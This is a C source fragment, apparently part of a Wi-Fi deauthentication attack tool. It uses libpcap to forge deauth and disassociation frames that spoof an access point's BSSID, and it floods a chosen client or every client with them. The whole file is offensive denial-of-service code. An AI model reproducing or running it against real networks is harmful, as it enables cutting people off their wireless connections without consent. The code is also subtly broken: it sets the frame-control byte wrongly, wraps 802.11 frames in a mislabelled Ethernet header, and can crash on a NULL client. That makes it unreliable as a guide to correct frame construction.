#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <netinet/ether.h>
#include <unistd.h> 

#define DEAUTH 0xC0
#define DISASSOC 0xA0
#define MAX_PACKETS 100

struct ieee80211_frame {
    u_int8_t i_fc[2];        // Frame control
    u_int8_t i_dur[2];       // Duration
    u_int8_t i_addr1[ETH_ALEN]; // Destination
    u_int8_t i_addr2[ETH_ALEN]; // Source
    u_int8_t i_addr3[ETH_ALEN]; // BSSID
    u_int8_t i_seq[2];       // Sequence
};

// Function to send control frame (Deauth/Disassoc)
void send_control_packet(pcap_t *handle, u_char *bssid, u_char *client, int subtype) { 
    struct ether_header *eth_header;
    u_char packet[128];
    
    // Prepare the Ethernet header
    memset(packet, 0, sizeof(packet));
    eth_header = (struct ether_header *) packet;

    // Set destination to client MAC or broadcast if client is NULL
    if (client == NULL) {
        memset(eth_header->ether_dhost, 0xFF, ETH_ALEN); // Broadcast
    } else {
        memcpy(eth_header->ether_dhost, client, ETH_ALEN);
    }

    // Set source to BSSID
    memcpy(eth_header->ether_shost, bssid, ETH_ALEN);
    eth_header->ether_type = htons(ETHERTYPE_AARP); // Ethernet type for 802.11

    // Construct the control frame (Deauth/Disassoc)
    struct ieee80211_frame *ctrl_frame = (struct ieee80211_frame *)(packet + sizeof(struct ether_header));
    memset(ctrl_frame, 0, sizeof(struct ieee80211_frame));
    memcpy(ctrl_frame->i_addr1, eth_header->ether_dhost, ETH_ALEN); // To the client
    memcpy(ctrl_frame->i_addr2, eth_header->ether_shost, ETH_ALEN); // From the BSSID
    memcpy(ctrl_frame->i_addr3, eth_header->ether_shost, ETH_ALEN); // BSSID

    ctrl_frame->i_fc[0] = 0x00; // Protocol version
    ctrl_frame->i_fc[1] = (0xC0 | subtype); // Type and subtype

    // Add reason code
    u_int16_t reason_code = htons(0x0001); // Unspecified reason
    memcpy(packet + sizeof(struct ether_header) + sizeof(struct ieee80211_frame), &reason_code, sizeof(reason_code));

    // Send packet multiple times
    for (int i = 0; i < MAX_PACKETS; i++) {
        if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
            fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(handle));
        }
        usleep(100000); // Delay between packets
    }

    printf("Sent control frame (subtype %d) to %s from %s\n", subtype, ether_ntoa((struct ether_addr *)client), ether_ntoa((struct ether_addr *)bssid));
}
